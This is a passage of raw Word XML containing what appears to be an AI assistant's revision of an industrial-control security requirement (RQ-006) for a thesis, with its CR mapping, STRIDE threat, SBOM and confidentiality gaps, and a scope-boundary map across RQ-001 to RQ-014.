          <w:t>-m...epoint.com]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId152" w:history="1">
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[ICS-</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Securi</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>endium_pdf</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00015538">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="31CEAEC6" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Lab-safety note:</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> DUT-side action is read-only enumeration; any CVE lookup runs on a separate Internet-connected host to preserve Zone-B isolation. </w:t>
      </w:r>
      <w:hyperlink r:id="rId153" w:history="1">
        <w:r w:rsidRPr="005B4077">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="005B4077">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>ifmworld</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="005B4077">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>-m...epoint.com]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6113B9D2" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="005B4077">
        <w:pict w14:anchorId="199822C0">
          <v:rect id="_x0000_i1420" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CCC899A" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="00015538" w:rsidRDefault="005B4077" w:rsidP="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Summary of Changes (vs. my original RQ-006)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DC7AA64" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="00015538" w:rsidRDefault="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="28"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Removed the identity-integrity / MITM over-reach</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — dropped the </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>CR 3.4 mapping</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, the </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Spoofing/Tampering-of-inventory</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> primary threat, </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Asset F</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> as primary, the </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-3 (inventory integrity)</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> gap, and the </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>TC-RQ004-04 (MITM) reuse</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. All </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>cross-referenced to RQ-005</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (protection of identified </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>software/data).</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(Consistent with the RQ-004 correction: RQ-004/006 identify; RQ-005 protects.)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FE0A92D" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="28"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Anchored your confidentiality point to CRs</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — added </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>CR 4.1 (+CR 4.3)</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> to the mapping so G-2 is traceable (previously a gap with no CR). </w:t>
      </w:r>
      <w:hyperlink r:id="rId154" w:history="1">
        <w:r w:rsidRPr="005B4077">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="005B4077">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="005B4077">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="78C6FDEF" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="00015538" w:rsidRDefault="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="28"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>STRIDE simplified</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> to </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Information Disclosure (primary)</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — the correct always-present threat for an identification requirement.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0508AAD2" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="28"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Kept the RQ-006 strengths</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — the </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>software-only scope</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (CR 7.8 sole primary; no data-fingerprint), the completed mitigation surface (</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/firmware/version</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>fieldbussetup</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>fieldbusfirmware</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>PROFIsafe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> stack), and the two genuine gaps: </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-1 (SBOM — decisive)</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-2 (confidentiality)</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:hyperlink r:id="rId155" w:history="1">
        <w:r w:rsidRPr="005B4077">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="005B4077">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="005B4077">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="005B4077">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId156" w:history="1">
        <w:r w:rsidRPr="005B4077">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="005B4077">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>ifmworld</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="005B4077">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>-m...epoint.com]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="388DEA78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 xml:space="preserve">Corrected verdict, tightly bounded: </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-006 = identify installed safety software (completeness, incl. SBOM gap) + keep that identification confidential</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — with </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>integrity/protection of the inventory</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> deferred to </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-005</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, and </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>change-tracking</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> deferred to </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-009</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3768CF91" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="005B4077" w:rsidRDefault="005B4077" w:rsidP="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="005B4077">
        <w:pict w14:anchorId="7C79EBE0">
          <v:rect id="_x0000_i1421" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AEFBC93" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="00015538" w:rsidRDefault="005B4077" w:rsidP="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Consolidation status</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A223781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>The scope-boundary recheck is now complete across the requirements that shared material:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DB8437A" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="00015538" w:rsidRDefault="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-001</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> → DoS/DCP-flood deferred to </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-010/RQ-011</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>; connecting-device integrity/authenticity core retained.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61018393" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="00015538" w:rsidRDefault="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-002</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> → evidence-collection deferred to </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-003</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>; tamper-resistance core retained.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12217998" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="00015538" w:rsidRDefault="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-004</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> → REVISION_COUNTER deferred to </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-009</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">; identity-integrity/MITM deferred to </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-005</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>; identification + confidentiality core retained.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="294271DE" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="00015538" w:rsidRDefault="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-005</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> → update-authorization/gate deferred to </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-011</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>; firmware/config integrity + authenticity core retained.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75172D95" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="00015538" w:rsidRDefault="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-006</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> → identity-integrity/MITM deferred to </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-005</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>; software-identification + confidentiality core retained.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="153CA877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 xml:space="preserve">The clean requirement boundaries are now: </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>identify (004/006) → protect (002/005) → authorize (011) → collect evidence (003/008/009) → retain/restrict (012/013/014) → withstand (001/010)</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5317901B" w14:textId="77777777" w:rsidR="005B4077" w:rsidRPr="00015538" w:rsidRDefault="005B4077" w:rsidP="005B4077">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Would you like me to (a) </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>re-check RQ-010</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> to confirm it correctly </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>receives</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> the DoS/DCP-flood tests now deferred from RQ-001 (and that its firmware-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>EoP</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> cross-references RQ-005/RQ-011 cleanly), or (b) proceed to </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>compile the fully corrected RQ-001 → RQ-014 set into the consolidated thesis appendix</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (Word/PDF) with the master traceability matrix and the boundary map above?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="203FD050" w14:textId="77777777" w:rsidR="00960153" w:rsidRDefault="00960153" w:rsidP="006F109C">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3FB513D6" w14:textId="77777777" w:rsidR="00960153" w:rsidRDefault="00960153" w:rsidP="006F109C">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0375D33D" w14:textId="77777777" w:rsidR="00960153" w:rsidRDefault="00960153" w:rsidP="006F109C">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="53B4E8F4" w14:textId="77777777" w:rsidR="00960153" w:rsidRDefault="00960153" w:rsidP="006F109C">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="39D9D6C3" w14:textId="77777777" w:rsidR="009B0AAA" w:rsidRDefault="009B0AAA" w:rsidP="006F109C">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1FCC6446" w14:textId="77777777" w:rsidR="009B0AAA" w:rsidRDefault="009B0AAA" w:rsidP="006F109C">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="617CD6BD" w14:textId="77777777" w:rsidR="009B0AAA" w:rsidRDefault="009B0AAA" w:rsidP="006F109C">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
